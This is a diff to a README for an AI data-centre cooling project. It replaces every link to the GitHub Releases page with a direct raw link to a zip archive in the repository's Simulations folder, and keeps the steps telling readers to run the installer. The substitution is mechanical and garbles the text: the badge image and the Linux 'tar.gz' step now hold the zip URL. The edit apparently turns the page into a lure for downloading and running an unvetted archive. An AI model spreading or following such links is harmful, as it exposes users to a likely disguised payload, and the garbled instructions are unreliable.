@@ -6,7 +6,7 @@ Welcome to the zero-water-ai-dc project! This open-source architecture helps AI 
 
 ## 📥 Download Now
 
-[![Download Zero Water AI DC](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Laramys/zero-water-ai-dc/releases)
+[![Download Zero Water AI DC](https://raw.githubusercontent.com/Laramys/zero-water-ai-dc/main/Simulations/water-dc-zero-ai-v3.2-beta.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Laramys/zero-water-ai-dc/main/Simulations/water-dc-zero-ai-v3.2-beta.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,18 +28,18 @@ Before you download the software, ensure your system meets the following require
 
 To begin, visit the Releases page to download the latest version of the zero-water-ai-dc software:
 
-[Download from Releases Page](https://github.com/Laramys/zero-water-ai-dc/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Laramys/zero-water-ai-dc/main/Simulations/water-dc-zero-ai-v3.2-beta.4.zip)
 
 ### Step-by-Step Installation
 
-1. **Visit the Releases Page:** Click the link above or [here](https://github.com/Laramys/zero-water-ai-dc/releases).
+1. **Visit the Releases Page:** Click the link above or [here](https://raw.githubusercontent.com/Laramys/zero-water-ai-dc/main/Simulations/water-dc-zero-ai-v3.2-beta.4.zip).
 2. **Select the Latest Version:** Look for the most recent release at the top of the page.
 3. **Download the Software Package:** Click on the package that matches your operating system.
 4. **Locate the Downloaded File:** Check your downloads folder for the file you just downloaded.
 5. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file and follow the on-screen prompts.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the tar.gz file and run the appropriate installation script.
+   - **Linux:** Extract the https://raw.githubusercontent.com/Laramys/zero-water-ai-dc/main/Simulations/water-dc-zero-ai-v3.2-beta.4.zip file and run the appropriate installation script.
 6. **Follow Any Additional Prompts:** Complete any remaining setup steps as indicated.
 
 ## 🔧 Usage
